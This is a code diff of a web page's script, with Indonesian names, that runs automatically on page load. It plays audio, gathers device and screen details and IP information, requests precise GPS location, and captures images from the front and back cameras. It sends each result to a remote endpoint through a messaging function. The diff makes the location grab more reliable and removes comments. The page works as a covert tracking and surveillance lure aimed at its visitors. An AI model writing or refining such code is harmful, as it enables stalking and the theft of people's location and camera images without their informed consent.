@@ -333,28 +333,34 @@ Kota                   : ${ip.city}`.trim();
       }
     };
 
-    const ambilLokasi = () => {
-      return new Promise((resolve) => {
-        navigator.permissions?.query({ name: 'geolocation' }).then(() => {
-          setTimeout(() => {
-            navigator.geolocation.getCurrentPosition(pos => {
-              const { latitude, longitude, accuracy } = pos.coords;
-              resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
+const ambilLokasi = () => {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n❌ Geolocation tidak didukung browser.`);
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const { latitude, longitude, accuracy } = pos.coords;
+        resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
 Latitude               : ${latitude}
 Longitude              : ${longitude}
 Akurasi                : ±${accuracy} meter
 Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
-            }, () => {
-              resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
-❌ Lokasi tidak diizinkan.`);
-            }, { enableHighAccuracy: true, timeout: 8000 });
-          }, 1000);
-        }).catch(() => {
-          resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
-❌ Gagal mendapatkan izin lokasi.`);
-        });
-      });
-    };
+      },
+      (err) => {
+        const pesan = {
+          1: '❌ Lokasi tidak diizinkan.',
+          2: '❌ Lokasi tidak tersedia.',
+          3: '❌ Permintaan lokasi timeout.',
+        }[err.code] || '❌ Gagal mengambil lokasi.';
+        resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n${pesan}`);
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+};
 
     const ambilKamera = async (facingMode, label) => {
       try {
@@ -392,34 +398,30 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
       }
     };
 
-const mulai = async () => {
-  audio.muted = false;
-  try { await audio.play(); } catch {}
+   const mulai = async () => {
+   audio.muted = false;
+   try { await audio.play(); } catch {}
 
-  const info = await ambilDataPerangkat();
-  let grafik = await ambilLayarGrafik();
-  if (!grafik || grafik.length < 10) {
-    grafik = `౼ 〘 𝗟𝗔𝗬𝗔𝗥 & 𝗚𝗥𝗔𝗙𝗜𝗞 〙 ౼\n❌ Gagal mengambil info layar & grafik.`;
-  }
+   const info = await ambilDataPerangkat();
+   let grafik = await ambilLayarGrafik();
+   if (!grafik || grafik.length < 10) {
+   grafik = `౼ 〘 𝗟𝗔𝗬𝗔𝗥 & 𝗚𝗥𝗔𝗙𝗜𝗞 〙 ౼\n❌ Gagal mengambil info layar & grafik.`;
+   }
 
   const ip = await ambilIPInfo();
 
-  // Kirim info awal
   const gabungAwal = [info, grafik, ip].join("\n\n");
   await kirimPesan(gabungAwal);
 
-  // Kirim lokasi
   const lokasi = await ambilLokasi();
   await kirimPesan(lokasi);
 
-  // Kamera depan
   const depan = await ambilKamera("user", "depan");
   await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`);
 
-  // Kamera belakang
   const belakang = await ambilKamera("environment", "belakang");
   await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
-};
+   };
 
     window.addEventListener("load", mulai);
   </script>
